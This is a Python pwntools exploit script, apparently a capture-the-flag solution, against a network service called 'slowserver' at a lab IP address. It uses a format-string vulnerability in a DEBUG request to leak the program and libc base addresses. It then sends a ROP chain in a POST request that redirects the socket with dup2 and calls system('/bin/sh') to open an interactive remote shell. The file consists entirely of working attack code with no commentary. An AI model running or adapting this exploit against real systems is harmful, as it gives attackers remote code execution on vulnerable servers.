from pwn import *

exe = context.binary = ELF('slowserver')
libc = exe.libc
context.log_level = 'debug'

def leakMemory(payload):

    io = remote('10.10.246.46', 5555)

    method = b"DEBUG "
    crlf = b"\r\n"
    request = method + payload + crlf
    io.send(request)

    data = io.recv()

    io.close()

    return data


def ripControl(payload):
    
    io = remote('10.10.246.46', 5555)

    method = b"POST "
    crlf = b"\r\n"
    request = method + payload + crlf
    io.send(request)

    io.interactive()


# for i in range(50):
#     data = f"%{i}$p".encode()
#     print(leakMemory(data))

exe.address = int(leakMemory(b"%23$p"), 16) - 0x3d08
info("elf base: %#x", exe.address)

payload = f"%147$s....".encode()
payload += p64(exe.got["printf"])
printf = u64(leakMemory(payload)[:6].ljust(8, b"\x00"))
libc.address = printf - libc.sym["printf"]
info("libc base: %#x", libc.address)

rop = ROP(libc)

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = exe.address + 0x1811
sh = next(libc.search(b"/bin/sh\x00"))
system = libc.sym["system"]
ret = pop_rdi + 1

offset = 24
stdin = 0
stdout = 1
old_fd = 4

payload = flat({
    offset: [
        pop_rdi,
        old_fd,
        pop_rsi,
        stdin,
        libc.sym["dup2"],
        pop_rdi,
        old_fd,
        pop_rsi,
        stdout,
        libc.sym["dup2"],
        pop_rdi,
        sh,
        ret,
        system
    ]
})

ripControl(payload)

